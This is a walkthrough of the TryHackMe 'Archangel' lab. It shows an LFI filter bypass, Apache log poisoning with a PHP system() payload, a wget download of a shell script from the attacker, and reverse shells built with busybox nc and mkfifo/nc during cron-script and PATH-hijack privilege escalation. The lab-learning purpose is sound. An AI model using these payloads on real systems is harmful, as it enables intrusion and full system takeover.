---
title: "Archangel"
date: 2025-03-05
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Archangel
categories: [TryHackMe, Easy]
tags: [linux, lfi, rce]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Archangel</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Boot2root, Web exploitation, Privilege escalation, LFI</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/archangel">https://tryhackme.com/room/archangel</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Archangel.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.56.166
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 10:54 EST
  Nmap scan report for 10.10.36.43
  Host is up (0.044s latency).
  Not shown: 998 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.56.166
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 10:54 EST
  Nmap scan report for 10.10.36.43
  Host is up (0.037s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
  |   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
  |_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Wavefire
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I began by analyzing the webserver, which displayed the company website of `Mafialive Solutions`. The website didn't reveal anything useful, except for the email: `support@mafialive.thm`. I added the domain to my hosts file and was redirected to a website that displayed the following:

![Development Site](/assets/img/tryhackme/Archangel/thm_archangel_1.jpg)

Since the site was under development, I looked for anything that might have been left behind, so I initiated a directory enumeration:
```bash
$ gobuster dir --url http://mafialive.thm/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 59]
/.html                (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
```

### Directory /test analysis

The website displayed a button that, when clicked, loaded the following URL:
```html
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

The view parameter caught my attention, so I attempted to achieve Local File Inclusion (LFI):
```bash
GET /test.php?view=../../../../../../../../../../etc/passwd HTTP/1.1
```

The website displayed:
```bash
Sorry, Thats not allowed
```

After researching, I found this <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">OWASP</a> testing guide entry. Using the PHP filter, I was able to retrieve the `test.php` file.
```bash
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==
```

After decoding it using CyberChef, I was able to read the content:
```html
<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

      //FLAG: thm{e[removed]1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
      if(isset($_GET["view"])){
      if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
              include $_GET['view'];
            }else{

    echo 'Sorry, Thats not allowed';
            }
  }
        ?>
    </div>
</body>
</html>
```

As seen in the source code, it is not allowed to use `../..`, and the parameter must contain `/var/www/html/development_testing`. With this information, I was able to bypass the restriction and read the `/etc/passwd` file:
```bash
GET /test.php?view=php://filter/var/www/html/development_testing/resource=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

## Shell as www-data

Since I was able to read arbitrary files, I accessed the `access.log` file. I modified my user agent to the following:
```html
GET /test.php?view=php://filter/var/www/html/development_testing/resource=/var/log/apache2/access.log HTTP/1.1
Host: mafialive.thm
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 <?php system($_GET['c']); ?> Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

This allowed me to execute commands:
```html
GET /test.php?view=php://filter/var/www/html/development_testing/resource=/var/log/apache2/access.log&c=id HTTP/1.1
Host: mafialive.thm
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

[attackerip] - - [21/Jan/2025:22:24:23 +0530] "GET /test.php?view=php://filter/var/www/html/development_testing/resource=/var/log/apache2/access.log HTTP/1.1" 200 829 "-" "Mozilla/5.0 uid=33(www-data) gid=33(www-data) groups=33(www-data)
Firefox/68.0"
```

I created a file called `shell.sh` containing a reverse shell, started a Python web server, and successfully uploaded the file to the webserver. After changing the file permissions, I executed it and received a reverse shell:
```html
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&c=wget http://[attackerip]:8000/shell.sh
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&c=chmod 777 shell.sh
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&c=bash%20shell.sh

$ nc -lnvp 9001
  listening on [any] 9001 ...
  connect to [attackerip] from (UNKNOWN) [10.10.170.187] 40232
  bash: cannot set terminal process group (514): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@ubuntu:/var/www/html/development_testing$
```

## Privilege Escalation archangel

While enumerating the system, I discovered an interesting entry in the `crontab`:
```bash
www-data@ubuntu:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

I analyzed the script, which was owned by the `archangel` user, but `www-data` had write permissions:
```bash
www-data@ubuntu:/$ cat /opt/helloworld.sh
  #!/bin/bash
  echo "hello world" >> /opt/backupfiles/helloworld.txt
www-data@ubuntu:$ ls -al /opt
total 16
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```

To exploit this, I simply appended a reverse shell at the end: 
```bash
www-data@ubuntu:/opt$ echo "busybox nc [attackerip] 9002 -e sh" >> helloworld.sh
```

A few seconds later, I received a reverse shell and was able to retrieve both the user1 and user2 flags:
```bash
archangel@ubuntu:~$ cat user.txt
  thm{l[removed]y}
archangel@ubuntu:~$ cd secret
archangel@ubuntu:~/secret$ cat user2.txt
  thm{h[removed]n}
```

## Privilege Escalation root
I continued by searching for files with the SUID bit set and found the following, caught my attention:
```bash
archangel@ubuntu:~$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /home/archangel/secret/backup
  [...]
```

After downloading the file to my local machine, I analyzed it using `strings`:
```bash
kali@kali:~/ctf/archangel$ strings backup
  [...]
  cp /home/user/archangel/myfiles/* /opt/backupfiles
  [...]
```

It was interesting that the `cp` command was not specified by it's full path. To exploit this, I created a new binary with the following content:
```bash
archangel@ubuntu:~$ touch /tmp/cp
archangel@ubuntu:~$ chmod 777 /tmp/cp
archangel@ubuntu:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attackerip] 4444 >/tmp/f" > /tmp/cp
archangel@ubuntu:~$ export PATH=/tmp:$PATH
```

After starting a Netcat listener, I executed the `backup` binary and received a reverse shell, successfully obtaining the root flag:
```bash
# whoami
  root
# cat /root/root.txt
  thm{p[removed]n}
```

solved! :)